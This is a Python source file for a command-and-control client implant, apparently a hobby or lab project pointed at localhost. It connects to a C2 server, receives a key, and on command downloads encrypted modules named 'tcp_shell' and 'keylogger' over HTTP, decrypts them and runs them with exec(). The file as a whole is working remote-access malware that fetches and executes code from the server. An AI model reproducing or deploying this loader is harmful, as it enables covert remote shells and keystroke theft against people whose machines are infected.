import socket,threading,hashlib,hmac,struct,base64

from urllib import request

def make_threaded(func):
    
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread 
    return wrapper



class client():

    def __init__(self, host, port):
        self.host = host
        self.host_port = port
        self.key = None
        self.connection = self.connect()
        

    #create a connection to C2 server
    def connect(self):
        print("creating connection")
        connection = socket.create_connection((self.host,self.host_port))
        data = connection.recv(1)
        if str(data.decode()) == 'g':
            print("connection established")
            connection.send('g'.encode())
            self.receive_key(connection)
        
        return connection
    
    def receive_key(self, connection):
        """Receives the encryption key from the server."""
        key_data = connection.recv(32)  
        if len(key_data) != 32:
            raise Exception("Failed to receive the full encryption key.")
        self.key = key_data
        print("Encryption key received.")
        
    
    @make_threaded
    def run_module(self,name):
        url = f"http://{self.host}:5001/{name}.py"
        encrypted_module_b64 = request.urlopen(url).read()
        encrypted_module = base64.b64decode(encrypted_module_b64)
        print(self.key)
        # Decrypt the module
        
        decrypted_module = self.decrypt(encrypted_module, self.key)
        if decrypted_module:
            exec(decrypted_module.decode('utf-8'))
        else:
            print("Failed to decrypt module.")
        
        
        return

    def decrypt(self,encrypted_content, key):
        """Decrypts content using XOR cipher with HMAC verification."""
        initialization_vector = encrypted_content[:16]  
        mac_tag = encrypted_content[16:48]  
        ciphertext = encrypted_content[48:]

        # Get HMAC key from the main key
        hmac_key = hashlib.sha256(key + b"hmac").digest()

        # Verify the HMAC tag
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha256)
        for byte in ciphertext:
            hmac_obj.update(bytes([byte]))  # Update HMAC with the ciphertext byte

        if not hmac.compare_digest(hmac_obj.digest(), mac_tag):
            print("HMAC verification failed. Data integrity compromised.")
            return None

        # Decrypt the ciphertext
        plaintext = bytearray()
        for i, byte in enumerate(ciphertext):
            xor_byte = byte ^ key[(i + struct.unpack(">I", initialization_vector[:4])[0]) % len(key)]
            plaintext.append(xor_byte)

        return bytes(plaintext)

    #listen for commands
    def run(self):
         while True:
            try:
                instruction = self.connection.recv(1024).decode()
                if not instruction:
                    break
                if instruction == 'shell':
                    print("starting  reverse shell")
                    self.run_module('tcp_shell')
                elif(str(instruction) == 'g'):
                    self.connection.send('g'.encode())
                elif(str(instruction) == 'keylogger'):
                    threading.Thread(target=self.run_module, args=('keylogger',)).start()

            except Exception as e:
                self.connection.sendall(str(e).encode()) 
        
            
            
c = client('localhost', 5000)
c.run()
   